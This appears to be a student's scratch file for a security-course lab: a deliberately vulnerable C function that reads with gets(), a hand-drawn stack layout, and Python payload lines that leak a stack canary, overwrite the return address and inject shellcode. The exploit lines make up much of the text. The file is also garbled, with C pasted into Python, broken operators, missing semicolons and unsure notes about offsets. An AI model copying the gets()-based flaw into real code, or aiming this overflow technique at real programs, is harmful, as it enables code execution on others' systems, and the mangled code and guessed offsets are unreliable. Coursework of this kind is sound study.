
from scaffold import SHELLCODE
import scaffold as p
/* Hint: No memory safety errors in this function * /
int nibble_to_int(char nibble) {
    if ('0' <= nibble & & nibble <= '9') return nibble - '0'
    else return nibble - 'a' + 10
}

void dehexify() {
    struct {
        char answer[BUFLEN]
        char buffer[BUFLEN]
    } c
    int i = 0, j = 0

    gets(c.buffer)

    while (c.buffer[i]) {
        if (c.buffer[i] == '\\' & & c.buffer[i+1] == 'x') {
            int top_half = nibble_to_int(c.buffer[i+2])
            int bottom_half = nibble_to_int(c.buffer[i+3])
            c.answer[j] = top_half << 4 | bottom_half
            i += 3
        } else {
            c.answer[j] = c.buffer[i]
        }
        i++
        j++
    }

    c.answer[j] = 0
    printf("%s\n", c.answer)
    fflush(stdout)
}

int main() {
    while (!feof(stdin)) {
        dehexify()
    }
    return 0
}

[4] RIP dehexify
[4] SFP dehexify
[M] compiler padding
[4] stack canary
[16] buffer
[16] answer
[4] int i
[4] int j

[4] & of c.buffer(either above or below this, we get a null byte?)
[4] RIP of gets
[4] SFP of gets

p.send('A' * x + '\\x' + 'A' * z + '\n')


#RIP = 0xffffd64c
# value at RIP is 0x8049341
#SFP = 0xffffd648
# value at it must be 0xffffd658

# Since we now buffer is 16 (4 rows) and we know where the sfp if located
# We can tell that the padding is 2 bytes longs

# Random thoughts:
# Looks like canaries is 4 rows(?) how many bites is this

# Hex: FF FF D6 50
# -->
# canary 0xb6743851

# can see that the padding is 8 bytes and the sfp is 4, we therefore
# have to
p.send('A'*32+canary+'A'*12+'\x50\xd6\xff\xff'+SHELLCODE+'\n')


# Program start:
p.start()

# Example send:
p.send('test\\x41\n')
print(p.recv(12))
# Example receive:
assert p.recv(6) == 'testA\n'
print("hello")

### YOUR CODE ENDS HERE ###
